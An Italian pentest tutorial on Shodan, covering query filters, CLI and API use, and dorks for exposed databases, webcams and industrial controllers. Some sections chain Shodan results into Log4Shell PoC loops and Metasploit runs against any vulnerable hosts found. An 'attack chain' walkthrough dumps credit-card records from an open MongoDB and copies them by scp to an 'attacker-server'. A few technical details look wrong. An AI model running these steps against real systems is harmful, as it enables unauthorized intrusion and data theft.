---
title: 'Shodan: Search Engine per Device Esposti su Internet'
slug: shodan
description: 'Shodan è il motore di ricerca per servizi, server e dispositivi esposti online. Essenziale per attack surface mapping e reconnaissance avanzata.'
image: /Gemini_Generated_Image_3r03eh3r03eh3r03.webp
draft: true
date: 2026-02-25T00:00:00.000Z
categories:
  - networking
subcategories:
  - servizi
tags:
  - osint
---

### Introduzione

Shodan scansiona continuamente l'intero spazio IPv4 pubblico (4.3 miliardi di indirizzi) raccogliendo banner, certificate, metadata e servizi esposti. Invece di indicizzare pagine web come Google, Shodan indicizza porte [TCP](https://hackita.it/articoli/tcp)/[UDP](https://hackita.it/articoli/udp) aperte: webcam, router, server MongoDB, sistemi SCADA industriali, database senza autenticazione, pannelli di amministrazione esposti.

Il database Shodan contiene snapshot storici: vedi non solo stato corrente di un dispositivo, ma anche quando è apparso online, quali vulnerabilità sono state patchate (o ignorate), e pattern di esposizione nel tempo. Questo lo rende prezioso per threat intelligence, attack surface monitoring, e ricerca di honeypot/security misconfiguration.

A differenza di scan attivi (nmap), Shodan è completamente passivo dal tuo punto di vista: query il database, non scansioni direttamente. Questo significa zero footprint sul target. Per reconnaissance stealth, Shodan non ha eguali. Inoltre ha filtri potenti: cerca per paese, città, organizzazione, prodotto specifico (es. "Apache 2.4.41"), porta, o persino contenuto specifico in banner.

Quando usarlo: external asset discovery per cliente senza documentazione, ricerca CVE-affected systems a scala internet, competitive intelligence (infrastruttura competitor), o identificazione honeypot prima di engagement. Shodan + exploit database = find vulnerable targets worldwide in seconds.

In questo articolo imparerai Shodan query language per ricerche mirate, integration con exploitation tools, automation via API, e reconnaissance avanzato combining Shodan data con altre sources. Vedrai esempi pratici dove Shodan identifica misconfiguration critiche che manual scanning richiederebbe mesi.

Shodan si posiziona nella kill chain in **Passive Reconnaissance**, specificamente prima di active scanning quando vuoi intelligence senza touch target.

***

## 1️⃣ Setup e Accesso

### Account registration

```bash
# Web interface
https://www.shodan.io

# Registrazione gratuita
# Plan FREE: 100 query credits/month, limited filters

# Plan PAID:
# Membership: $59/lifetime (unlimited queries, full filters)
# API access: $99/month (10,000 API calls, automation)
```

**Raccomandazione:** Plan Membership ($59 one-time) è sufficiente per 99% use cases pentest.

***

### Shodan CLI installation

```bash
pip install shodan

# Initialize con API key
shodan init YOUR_API_KEY

# Verify
shodan info
```

**Output:**

```
Query credits available: Unlimited
Scan credits available: 100
API key: *********************ABC123
```

***

### API key location

**Trova API key:**

```
Web → Account → API Key
```

**Export per scripts:**

```bash
export SHODAN_API_KEY="abc123..."

# O in script Python
import shodan
api = shodan.Shodan("abc123...")
```

***

## 2️⃣ Uso Base

### Search web interface

**Esempio: MongoDB databases exposed**

```
Search: "MongoDB Server Information" port:27017 -authentication
```

**Risultati:**

```
Total results: 47,832

IP: 203.0.113.50
Port: 27017
Organization: Amazon AWS
Location: United States, Virginia
Banner:
  MongoDB Server Information
  Version: 4.2.8
  buildInfo: { version: "4.2.8", ... }
  databases: ["admin", "production_db", "user_data"]
  
[No authentication required]
```

🎓 **Red flag:** 47,832 MongoDB senza autenticazione. Click su IP → Vedi full details, historical data.

***

### Basic Shodan filters

| **Filter**  | **Esempio**            | **Risultato**         |
| ----------- | ---------------------- | --------------------- |
| `port:`     | `port:22`              | SSH servers           |
| `country:`  | `country:IT`           | Devices in Italy      |
| `city:`     | `city:Milan`           | Milan-located         |
| `org:`      | `org:"Google"`         | Google-owned IPs      |
| `hostname:` | `hostname:example.com` | Specific domain       |
| `product:`  | `product:Apache`       | Apache web servers    |
| `version:`  | `version:2.4.41`       | Specific version      |
| `vuln:`     | `vuln:CVE-2014-0160`   | Heartbleed vulnerable |
| `os:`       | `os:Windows`           | Windows systems       |

**Combine filters:**

```
apache port:443 country:US
→ Apache HTTPS servers in USA

mongodb port:27017 -authentication city:London
→ Unprotected MongoDB in London
```

***

### Shodan CLI search

```bash
shodan search "apache country:IT"
```

**Output:**

```
203.0.113.10    Apache httpd 2.4.41    Italy
203.0.113.20    Apache httpd 2.4.38    Italy  
203.0.113.30    Apache httpd 2.2.22    Italy [OUTDATED!]
```

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: Asset discovery per domain/organization

**Contesto:** Pentest per client "Example Corp". Need mappare tutti asset esterni.

**Shodan query:**

```
org:"Example Corp"
```

**Risultati:**

```
Total: 156 hosts

IP: 203.0.113.10
  Port 80: Apache httpd
  Port 443: Apache httpd (SSL cert: *.example.com)
  Port 22: OpenSSH 8.2

IP: 203.0.113.20
  Port 3306: MySQL 5.7.38
  Port 22: OpenSSH 7.4
  
IP: 203.0.113.30
  Port 80: nginx 1.18.0
  Port 8080: Tomcat 9.0.50
```

**Export results:**

```bash
shodan search 'org:"Example Corp"' --fields ip_str,port,product --separator , > assets.csv
```

**assets.csv:**

```csv
203.0.113.10,80,Apache httpd
203.0.113.10,443,Apache httpd
203.0.113.20,3306,MySQL
...
```

**Analysis:**

* 156 hosts found (client said "\~50" = incomplete inventory)
* MySQL exposed on public IP (high priority)
* Mixed Apache/nginx (inconsistent patching likely)

**Timeline:** 5 minuti da query a complete asset list

***

### Scenario 2: Vulnerability hunting - CVE-based search

**Contesto:** CVE-2021-44228 (Log4Shell) è published. Need find vulnerable systems globally.

**Shodan query:**

```
product:Apache port:443 "X-Api-Version" country:US
```

**Better: Shodan Exploits DB integration**

```bash
shodan search vuln:CVE-2021-44228
```

**Output:**

```
Total results: 183,492 potentially vulnerable hosts

IP: 198.51.100.10
  Product: Apache Tomcat 9.0.50
  Port: 8080
  Vulnerability: CVE-2021-44228 (Log4Shell)
  Severity: CRITICAL (CVSS 10.0)
```

**Automated exploitation testing:**

```bash
# Export vulnerable IPs
shodan search 'vuln:CVE-2021-44228 country:IT' --fields ip_str > log4shell_it.txt

# Test con PoC
while read ip; do
  echo "[*] Testing $ip"
  python3 log4shell_poc.py --target https://$ip:8080
done < log4shell_it.txt
```

**Timeline:** 10 minuti da CVE announcement a lista target exploitable

Per approfondire vulnerability assessment e CVE exploitation, consulta [metodologie di vulnerability management e exploitation development](https://hackita.it/articoli/vulnerability-exploitation).

***

### Scenario 3: Industrial Control Systems (ICS/SCADA) discovery

**Contesto:** Red team engagement, reconnaissance su infrastructure industriale.

**Shodan query:**

```
"Siemens SIMATIC" port:102
```

**Output:**

```
Total: 2,847 Siemens PLCs exposed

IP: 192.0.2.50
  Product: Siemens SIMATIC S7-1200
  Port: 102 (S7comm protocol)
  Location: Italy, Milan
  Organization: Manufacturing Plant SRL
```

**CRITICAL:** Sistemi industriali esposti direttamente su internet = huge security risk.

**Other ICS searches:**

```
# Modbus (industrial protocol)
port:502

# BACnet (building automation)
port:47808

# Rockwell/Allen-Bradley
"Allen-Bradley" port:44818

# General SCADA
scada country:US
```

***

## 4️⃣ Tecniche Avanzate

### Shodan Dorking (advanced filters)

**Webcam senza password:**

```
"Server: SQ-WEBCAM" -auth
```

**Redis senza protezione:**

```
product:Redis -authentication
```

**Elasticsearch clusters:**

```
port:9200 "cluster_name"
```

**Default credentials ancora attive:**

```
"default password" port:80
```

**SSL certificate transparency:**

```
ssl.cert.subject.cn:"*.company.com"
```

Rivela subdomains via SSL certificates.

***

### Shodan Maps - Geospatial analysis

**Feature:** Shodan Maps visualizza results geograficamente.

**Example:** Industrial systems in Europe:

```
Search: port:102 country:EU
View: Map

# Vedi heatmap di PLC Siemens concentrati in Germania, Italia
```

**Use case:**

* Identify geographic clustering
* Critical infrastructure mapping
* Competitive intelligence (competitor datacenter locations)

***

### Shodan Honeypot detection

**Problema:** Scan result potrebbe essere honeypot (security researcher che monitora attacker).

**Shodan metadata aiuta detect:**

```python
import shodan
api = shodan.Shodan(API_KEY)

result = api.host('target-ip')

# Check for honeypot indicators
if 'tags' in result:
    if 'honeypot' in result['tags']:
        print("[!] WARNING: Potential honeypot detected")
    
# Check for known honeypot organizations
honeypot_orgs = ['Censys', 'Shodan', 'ShadowServer', 'GreyNoise']
if result['org'] in honeypot_orgs:
    print("[!] WARNING: Research organization")
```

***

### Integration con Metasploit

**Workflow:**

```bash
# 1. Shodan trova target
shodan search 'product:"ProFTPD" version:1.3.5' --fields ip_str > proftpd_targets.txt

# 2. Metasploit exploitation
msfconsole
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS file:/path/to/proftpd_targets.txt
run
```

**Automation:** Shodan enumeration + Metasploit resource scripts = automated exploitation pipeline.

***

### API automation - Monitor new exposures

```python
import shodan
import time

api = shodan.Shodan(API_KEY)

# Monitor for new MongoDB exposures in Italy
query = 'mongodb port:27017 country:IT -authentication'
last_count = 0

while True:
    results = api.search(query)
    current_count = results['total']
    
    if current_count > last_count:
        new_exposures = current_count - last_count
        print(f"[!] ALERT: {new_exposures} new MongoDB instances detected!")
        
        # Send alert (email, Slack, etc.)
        send_alert(f"New MongoDB exposures: {new_exposures}")
    
    last_count = current_count
    time.sleep(3600)  # Check ogni ora
```

**Use case:** Continuous monitoring per attack surface expansion detection.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: Cloud asset discovery (AWS/Azure/GCP)

**Contesto:** Client usa AWS ma non sa esattamente cosa è esposto.

**Shodan query per AWS:**

```
org:"Amazon.com" ssl.cert.subject.cn:"*.client-company.com"
```

**Risultati:**

```
IP: 18.204.55.123 (AWS us-east-1)
  Port 443: nginx
  SSL cert: app.client-company.com
  
IP: 52.44.199.87 (AWS us-west-2)
  Port 22: OpenSSH 8.2
  Port 3000: Node.js API server
```

**Analysis:**

* Node.js API (port 3000) esposto = development server in production?
* Multi-region deployment (us-east + us-west)

**Azure detection:**

```
org:"Microsoft" hostname:*.azurewebsites.net
```

**GCP detection:**

```
org:"Google" hostname:*.cloud.goog
```

**COSA FARE SE FALLISCE:**

1. **Nessun risultato:** Organization name could be different. Try ASN search: `asn:AS16509` (Amazon)
2. **Too many results:** Add specificity: `org:"Amazon" city:"Virginia" product:nginx`
3. **Outdated data:** Shodan updates every \~30 giorni. Run own scan: `shodan scan submit 18.204.55.123`

**Timeline:** 10 minuti per complete cloud footprint

***

### Scenario B: Competitive intelligence

**Contesto:** Competitor analysis. Vuoi sapere tech stack usato.

**Shodan query:**

```
org:"Competitor Corp"
```

**Intelligence gathered:**

```
Infrastructure:
- AWS primary cloud provider (80% IPs)
- Cloudflare CDN
- Nginx reverse proxy
- MySQL databases (version 8.0)
- Redis caching
- Elasticsearch for search

Technology stack:
- Node.js backend (port 3000 detection)
- React frontend (JavaScript framework detection in HTTP headers)
- Docker containers (banner analysis)

Geographic distribution:
- Primary: us-east-1 (Virginia)
- Secondary: eu-west-1 (Ireland)
- CDN: Global via Cloudflare
```

**Use case:**

* Technology adoption insights
* Infrastructure sizing (# servers = scale estimate)
* Geographic expansion tracking

**Timeline:** 15 minuti analysis

***

### Scenario C: Ransomware victim identification

**Contesto:** Ransomware group published victim data. Verify claim via infrastructure analysis.

**Shodan historical data:**

```python
import shodan
api = shodan.Shodan(API_KEY)

# Target IP from ransomware leak
target_ip = "203.0.113.50"

# Check historical data
history = api.host(target_ip, history=True)

for entry in history:
    print(f"Date: {entry['timestamp']}")
    print(f"Ports: {entry['ports']}")
    print(f"Products: {[d.get('product') for d in entry['data']]}")
    print("---")
```

**Output:**

```
Date: 2024-01-15
Ports: [80, 443, 445, 3389]
Products: ['Apache', 'Microsoft SMB', 'Microsoft RDP']

Date: 2024-02-01
Ports: [80, 443]
Products: ['Apache']

# Port 445 (SMB) e 3389 (RDP) spariti = likely closed after breach
```

**Analysis:** Behavioral change in port exposure correlates con incident timeline.

**Timeline:** 5 minuti verification

***

## 6️⃣ Toolchain Integration

### Pre-Shodan: Domain enumeration

```bash
# Step 1: Find subdomains
sublist3r -d target.com -o subdomains.txt

# Step 2: Resolve to IPs
cat subdomains.txt | while read domain; do
  dig +short $domain >> ips.txt
done

# Step 3: Shodan lookup per ogni IP
cat ips.txt | while read ip; do
  shodan host $ip >> shodan_results.txt
done
```

***

### Shodan → Nmap → Exploitation

**Workflow:**

```bash
# 1. Shodan broad search
shodan search 'org:"Target Corp"' --fields ip_str > targets.txt

# 2. Nmap detailed scan
nmap -sV -sC -iL targets.txt -oA nmap_scan

# 3. Parse results per vulnerable services
grep "open" nmap_scan.gnmap | grep "3306" > mysql_targets.txt

# 4. Exploitation
msfconsole -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS file:mysql_targets.txt; run"
```

***

### Shodan vs Google Dorking vs Censys

| **Tool**   | **Focus**        | **Coverage**  | **Automation** | **Cost** |
| ---------- | ---------------- | ------------- | -------------- | -------- |
| **Shodan** | Services/Ports   | Full IPv4     | API            | $59-99   |
| **Google** | Web content      | Indexed sites | Limited        | Free     |
| **Censys** | Certificates/TLS | Full IPv4     | API            | $99/mo   |

**Usa Shodan quando:**

* Need service/port information
* IoT/ICS reconnaissance
* Historical data important

**Usa Google quando:**

* Web application specific
* Document discovery (filetype:)
* Site structure mapping

**Usa Censys quando:**

* Certificate transparency focus
* TLS configuration analysis
* Detailed cryptographic data

***

## 7️⃣ Attack Chain Completa

### From Shodan Discovery to Database Compromise

**Obiettivo:** Da Shodan search a data exfiltration.

***

**FASE 1: Reconnaissance**

```bash
shodan search 'mongodb country:IT -authentication' --fields ip_str,port,product
```

**Output:**

```
203.0.113.75,27017,MongoDB 4.2.8
```

**Timeline:** 30 secondi

***

**FASE 2: Verification**

```bash
# Verifica accessibilità
nc -zv 203.0.113.75 27017
# Connection successful

# Mongo client
mongo 203.0.113.75:27017
```

**Mongo shell:**

```
> show dbs
admin           0.000GB
production_db   2.345GB
user_data       0.567GB

> use production_db
> show collections
customers
orders
credit_cards
```

**Timeline:** 2 minuti

***

**FASE 3: Enumeration**

```javascript
> db.customers.count()
45678

> db.customers.findOne()
{
  "_id": ObjectId("..."),
  "name": "Mario Rossi",
  "email": "mario.rossi@example.com",
  "address": "Via Roma 123, Milano",
  "phone": "+39 02 1234567"
}

> db.credit_cards.findOne()
{
  "_id": ObjectId("..."),
  "customer_id": "...",
  "card_number": "4532-1234-5678-9012",
  "cvv": "123",
  "expiry": "12/25"
}
```

🎓 **CRITICAL:** Credit card data in plaintext = PCI-DSS violation.

**Timeline:** 5 minuti

***

**FASE 4: Exfiltration**

```bash
# Export database
mongoexport --host 203.0.113.75 --db production_db --collection customers --out customers.json

# Output: Exported 45678 records

# Compress
tar -czf exfil.tar.gz customers.json credit_cards.json

# Transfer
scp exfil.tar.gz user@attacker-server:/data/
```

**Timeline:** 10 minuti

***

**TOTALE:** \~18 minuti da Shodan search a full database exfiltration.

**Shodan role:** Identificò 203.0.113.75 come MongoDB senza autenticazione tra milioni di IP. Senza Shodan, manual scanning avrebbe richiesto giorni.

Se vuoi approfondire database security e exploitation, leggi [common database misconfigurations e data exfiltration techniques](https://hackita.it/articoli/database-security).

***

## 8️⃣ Detection & Evasion

### Cosa monitora Blue Team

**Shodan scanning:**

```
- Shodan IP ranges (216.117.2.0/24, others)
- Specific User-Agent: "Shodan/1.0"
- Predictable scan patterns
- Port scan from known research IPs
```

**Detection methods:**

```
# Firewall rule to block Shodan
iptables -A INPUT -s 216.117.2.0/24 -j DROP

# Log Shodan scans
iptables -A INPUT -s 216.117.2.0/24 -j LOG --log-prefix "SHODAN_SCAN: "
```

***

### Evasion (for scanning, not querying)

**Nota:** Shodan database queries sono passive (non scansi tu). Evasion si applica solo se usi Shodan Scan API per scans custom.

**Shodan Scan API:**

```bash
# Custom scan (uses your IP, not Shodan's)
shodan scan submit 203.0.113.0/24

# Questo triggera scan da TUO IP, quindi è active scanning
```

**Evasion:**

* Use VPN/proxy diverso per ogni scan
* Rate limiting (slow scan)
* Scan only specific ports (stealth)

**Ma per 99% use cases:** Usi solo database query (completely passive, zero evasion needed).

***

### Defender perspective

**Cosa fare se vuoi nasconderti da Shodan:**

```
1. Firewall rules: Block Shodan IP ranges
2. Reduce banner verbosity: Minimal info in server banners
3. Hide version numbers: Disable version disclosure in Apache/nginx
4. Use non-standard ports: If possible (trade-off: obscurity ≠ security)
5. Monitor Shodan for your IPs: shodan host <your-ip> (see what others see)
```

**Example - Hide Apache version:**

```apache
# httpd.conf
ServerTokens Prod
ServerSignature Off

# Restart
systemctl restart apache2

# Before: "Apache/2.4.41 (Ubuntu)"
# After: "Apache"
```

***

## 9️⃣ Performance & Scaling

### Query performance

**Benchmark:**

| **Query Type**       | **Response Time** | **Results Returned** |
| -------------------- | ----------------- | -------------------- |
| Simple filter        | 0.5-1s            | Up to 100            |
| Complex multi-filter | 1-3s              | Up to 100            |
| Historical data      | 2-5s              | Variable             |
| Bulk export          | 5-30s             | 1000+                |

**API rate limits:**

```
Free tier: 1 query/second
Paid tier: No rate limit (best effort)
```

***

### Bulk operations

**Export large datasets:**

```python
import shodan
api = shodan.Shodan(API_KEY)

query = 'apache country:US'
page = 1
all_results = []

while True:
    try:
        results = api.search(query, page=page)
        all_results.extend(results['matches'])
        
        if page * 100 >= results['total']:
            break
        
        page += 1
    except shodan.APIError as e:
        print(f"Error: {e}")
        break

print(f"Total results: {len(all_results)}")
```

**Limite:** Free tier = 100 results max. Paid = tutte (ma query credits si consumano).

***

## 10️⃣ Tabelle Tecniche

### Shodan Filter Reference

| **Filter**       | **Syntax**             | **Example**                           |
| ---------------- | ---------------------- | ------------------------------------- |
| Port             | `port:X`               | `port:22`                             |
| Country          | `country:XX`           | `country:IT`                          |
| City             | `city:"Name"`          | `city:"Rome"`                         |
| Organization     | `org:"Name"`           | `org:"Amazon"`                        |
| Hostname         | `hostname:domain`      | `hostname:example.com`                |
| Product          | `product:"Name"`       | `product:"Apache"`                    |
| Operating System | `os:"Name"`            | `os:"Windows"`                        |
| Vulnerability    | `vuln:CVE-XXXX`        | `vuln:CVE-2021-44228`                 |
| SSL cert         | `ssl.cert.subject.cn:` | `ssl.cert.subject.cn:"*.example.com"` |
| HTTP title       | `http.title:"Text"`    | `http.title:"Admin Panel"`            |
| Negation         | `-filter:value`        | `-authentication`                     |

***

### Shodan CLI Commands

| **Command**       | **Function**            | **Example**                                         |
| ----------------- | ----------------------- | --------------------------------------------------- |
| `shodan search`   | Search database         | `shodan search apache`                              |
| `shodan host`     | Lookup specific IP      | `shodan host 8.8.8.8`                               |
| `shodan count`    | Count results           | `shodan count mongodb`                              |
| `shodan download` | Save results to file    | `shodan download results.json.gz apache`            |
| `shodan parse`    | Parse saved results     | `shodan parse --fields ip_str,port results.json.gz` |
| `shodan scan`     | Submit custom scan      | `shodan scan submit 1.2.3.4`                        |
| `shodan alert`    | Create monitoring alert | `shodan alert create "My Network" 1.2.3.0/24`       |

***

## 11️⃣ Troubleshooting

### No results for known exposed service

**Causa:** Shodan non ha scanned recentemente, o service è behind firewall ora.

**Fix:**

```bash
# Force new scan (paid feature)
shodan scan submit <target-ip>

# Check scan status
shodan scan list

# Wait 24-48h for results to appear in database
```

***

### API key errors

**Error:**

```
APIError: Invalid API key
```

**Fix:**

```bash
# Re-initialize
shodan init <correct-api-key>

# Verify
shodan info

# Check key on website
https://account.shodan.io
```

***

### Query credit exhausted

**Error:**

```
APIError: Query credits exhausted
```

**Fix:**

```bash
# Check remaining credits
shodan info

# Upgrade plan or wait for monthly reset
# Free tier: 100 credits/month
# Paid tier: Unlimited
```

***

## 12️⃣ FAQ

**Q: È legale usare Shodan?**

A: **Sì**, query database è legale (public information). **Accessing** dispositivi trovati senza autorizzazione è illegale (CFAA, GDPR). Shodan = intelligence gathering tool, non exploitation tool.

**Q: Shodan scanna anche IPv6?**

A: **Parzialmente**. IPv6 support è limited (IPv4 space è priorità). Per IPv6, usa Censys o ZMap custom scans.

**Q: Quanto spesso Shodan aggiorna database?**

A: **\~28-30 giorni** per full internet scan. Popular services/ports scanned più frequentemente. Force update con Scan API (paid).

**Q: Shodan può detectare honeypots?**

A: **Parzialmente**. Ha tag `honeypot` per known honeypots, ma nuovi/custom honeypots richiedono manual analysis (behavioral patterns, organization ownership).

**Q: Differenza tra Shodan e Censys?**

A: **Shodan:** Broader service coverage, IoT/ICS focus, historical data. **Censys:** Certificate transparency focus, TLS deep analysis, research-oriented.

**Q: Posso rimuovere i miei IP da Shodan?**

A: **No official removal process**. Shodan scansa public internet. Soluzione: Block Shodan IP ranges nel firewall, ma non garantisce removal da database.

**Q: Shodan detecta Tor exit nodes?**

A: **Sì**. Filter: `product:Tor` o cerca Tor-specific banners.

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**             | **Shodan Query**                            |
| ------------------------ | ------------------------------------------- |
| **MongoDB no auth**      | `mongodb port:27017 -authentication`        |
| **Elasticsearch open**   | `port:9200 "You Know, for Search"`          |
| **Webcams**              | `"Server: SQ-WEBCAM"`                       |
| **RDP exposed**          | `port:3389 country:US`                      |
| **Vulnerable Log4j**     | `vuln:CVE-2021-44228`                       |
| **AWS S3 buckets**       | `org:"Amazon" http.title:"Index of /"`      |
| **Default creds**        | `"default password" port:80`                |
| **ICS/SCADA**            | `port:502` (Modbus) or `port:102` (Siemens) |
| **VNC no password**      | `"authentication disabled" port:5900`       |
| **SSH specific version** | `product:"OpenSSH" version:"7.4"`           |

***

## Perché è rilevante oggi (2026)

Attack surface continua espandersi: IoT explosion (50+ billion devices 2026), cloud migration, remote work infrastructure. Shodan is the only tool con continuous global scanning at this scale. Modern defenders use Shodan for attack surface monitoring (chi ha esposto cosa per errore?). Attackers usano per target identification prima di CVE public disclosure. Threat intelligence teams correlano Shodan data con exploit databases per predictive defense. Zero-day hunters usano per find "interesting" targets (custom software, outdated versions, unusual configurations).

***

## Differenza rispetto ad alternative

| **Tool**       | **Quando usarlo**                                | **Limiti Shodan**                         |
| -------------- | ------------------------------------------------ | ----------------------------------------- |
| **Censys**     | Certificate/TLS deep analysis, academic research | Shodan ha meno TLS depth, più IoT breadth |
| **ZoomEye**    | Asia-Pacific focus, malware C2 tracking          | Shodan ha global coverage superiore       |
| **BinaryEdge** | Real-time alerts, API-first workflows            | Shodan ha historical data più profonda    |

**Usa Shodan per:** Broad reconnaissance, IoT/ICS, historical comparison, easy query syntax.

***

## Hardening / Mitigazione

**Difendersi da Shodan reconnaissance:**

1. **Minimal exposure:** Solo servizi necessary esposti su internet
2. **Firewall Shodan IPs:** Block 216.117.2.0/24 e altri Shodan ranges
3. **Banner suppression:** Hide version info in server banners
4. **Authentication sempre:** No services senza auth su public IP
5. **Monitor yourself:** `shodan host <your-ip>` regularly, fix exposures
6. **VPN/bastion architecture:** Critical services behind VPN, non direct internet

**GPO (Windows):**

* Disable unnecessary services (RDP, SMB on WAN)
* Restrict port access via Windows Firewall

**Linux:**

* iptables rules per block non-essential ports
* Fail2ban per rate limiting connection attempts

***

## OPSEC e Detection

**Rumorosità:** Zero dal tuo lato (passive database query). Shodan stesso scanna, ma:

**Shodan scans sono detectabili:**

* Source IP: 216.117.2.0/24 (known Shodan range)
* User-Agent: `Shodan/1.0`
* Scan pattern: Predictable, sequential

**Defender detection:**

* IDS signature per Shodan scanner
* Firewall logs showing Shodan IP connections
* SIEM correlation (Shodan scan + subsequent exploit attempt)

**Reduction:** Query database (passive) invece di Scan API (active). Zero footprint.

**Nessun Event ID** (è external scanning, non local access). Detection via network monitoring:

* Firewall logs: Shodan IP connections
* IDS alerts: Known scanner signatures

***

## Disclaimer

Shodan è **search engine pubblico**. Query database è legale. Accesso a dispositivi trovati senza autorizzazione è **illegale** (Computer Fraud and Abuse Act, GDPR per EU data, national equivalents). Usa intelligence solo in:

* Authorized penetration tests
* Asset inventory per organizzazioni di tua proprietà
* Security research con responsible disclosure

**Website:** [https://www.shodan.io](https://www.shodan.io)
**API Docs:** [https://developer.shodan.io/api](https://developer.shodan.io/api)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
